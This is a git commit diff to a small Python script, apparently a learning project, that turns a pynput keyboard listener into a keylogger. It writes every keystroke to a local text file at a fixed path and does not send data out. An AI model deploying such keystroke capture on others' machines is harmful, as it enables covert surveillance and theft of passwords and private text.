2793d1b553da5bbe999986ab760c78cc29fa6b4f
Sidd <siddharthg1703@gmail.com>
2024-12-29 22:36:15 +0530

    Basic key logger. It follows character input. No repetitions and clear to understand. Saves data in a newly created text file

--- main.py
+++ main.py
@@ -1,17 +1,27 @@
 from pynput import keyboard
 
+#names file
 logs_file = "log_file.txt"
+#specifies location of file
+logs_file = "E:/Key_log/log_file.txt"
 
 def press(key):
     try:
-        print('{0}'.format(key.char), end="", flush=True)
+        #return/ save character entered into log file
+        with open(logs_file, "a") as log:
+            log.write('{0}'.format(key.char))
     except AttributeError:
-        print('{0}'.format(key), end="", flush=True)
+        with open(logs_file, "a") as log:
+            log.write('{0}'.format(key))
 
 def release(key):
     if key == keyboard.Key.esc:
         # Stop listener
         return False
+
+#create new file/ overwrites old file
+with open(logs_file, "w") as log:
+    log.write("")
 
 with keyboard.Listener(
         on_press = press,
